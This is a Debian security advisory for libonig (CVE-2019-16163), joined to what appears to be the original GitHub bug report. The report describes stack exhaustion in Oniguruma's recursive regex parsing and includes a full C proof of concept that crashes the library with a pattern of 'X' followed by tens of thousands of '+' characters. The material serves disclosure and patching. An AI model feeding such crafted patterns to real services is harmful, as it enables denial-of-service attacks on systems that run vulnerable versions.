Hash: SHA512

Package        : libonig
Version        : 5.9.5-3.2+deb8u3
CVE ID         : CVE-2019-16163
Debian Bug     : 939988

The Oniguruma regular expressions library, notably used in PHP
mbstring, is vulnerable to stack exhaustion.  A crafted regular
expression can crash the process.

For Debian 8 "Jessie", this problem has been fixed in version
5.9.5-3.2+deb8u3.

We recommend that you upgrade your libonig packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be

## Description

![@RKX1209](https://avatars.githubusercontent.com/u/964758?u=d3d47c054e67dc762703d9a2dabaab732ea4f8bf&v=4&size=48)[RKX1209](https://github.com/RKX1209)opened [on Jul 29, 2019](https://github.com/kkos/oniguruma/issues/147#issue-473824113)

If Oniguruma try to parse very deep regex nodes, it causes stack buffer overflow due to deep recursive calls to some parsing functions like optimize\_nodes(), tree\_min\_len().

Here is a POC source code that simply executes onig\_search() with very large regular expression "X+++++++++++++++++++++++++++++++ .... ".

```
/*
 * oniguruma_sbof.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "oniguruma.h"

extern int exec(OnigSyntaxType* syntax, char* apattern, char* astr)
{
  int r;
  unsigned char *start, *range, *end;
  regex_t* reg;
  OnigErrorInfo einfo;
  OnigRegion *region;
  UChar* pattern = (UChar* )apattern;
  UChar* str     = (UChar* )astr;

  r = onig_new(&reg, pattern, pattern + strlen((char* )pattern),
               ONIG_OPTION_DEFAULT, ONIG_ENCODING_ASCII, syntax, &einfo);
  if (r != ONIG_NORMAL) {
    char s[ONIG_MAX_ERROR_MESSAGE_LEN];
    onig_error_code_to_str((UChar* )s, r, &einfo);
    fprintf(stderr, "ERROR: %s\n", s);
    return -1;
  }

  region = onig_region_new();

  end   = str + strlen((char* )str);
  start = str;
  range = end;
  r = onig_search(reg, str, end, start, range, region, ONIG_OPTION_NONE);
  if (r >= 0) {
    int i;

    fprintf(stderr, "match at %d\n", r);
    for (i = 0; i < region->num_regs; i++) {
      fprintf(stderr, "%d: (%d-%d)\n", i, region->beg[i], region->end[i]);
    }
  }
  else if (r == ONIG_MISMATCH) {
    fprintf(stderr, "search fail\n");
  }
  else { /* error */
    char s[ONIG_MAX_ERROR_MESSAGE_LEN];
    onig_error_code_to_str((UChar* )s, r);
    fprintf(stderr, "ERROR: %s\n", s);
    onig_region_free(region, 1 /* 1:free self, 0:free contents only */);
    onig_free(reg);
    return -1;
  }

  onig_region_free(region, 1 /* 1:free self, 0:free contents only */);
  onig_free(reg);
  return 0;
}

#define REGEX_SZ 0x10000

extern int main(int argc, char* argv[])
{
  int r, i;

  OnigEncoding use_encs[] = { ONIG_ENCODING_ASCII };
  char regex[REGEX_SZ] = {0};
  regex[0] = 'X';
  for (i = 1; i < REGEX_SZ; i++) regex[i] = '+';

  onig_initialize(use_encs, sizeof(use_encs)/sizeof(use_encs[0]));

  r = exec(ONIG_SYNTAX_RUBY, regex, "bgc");

  onig_end();
  return r;
}
```
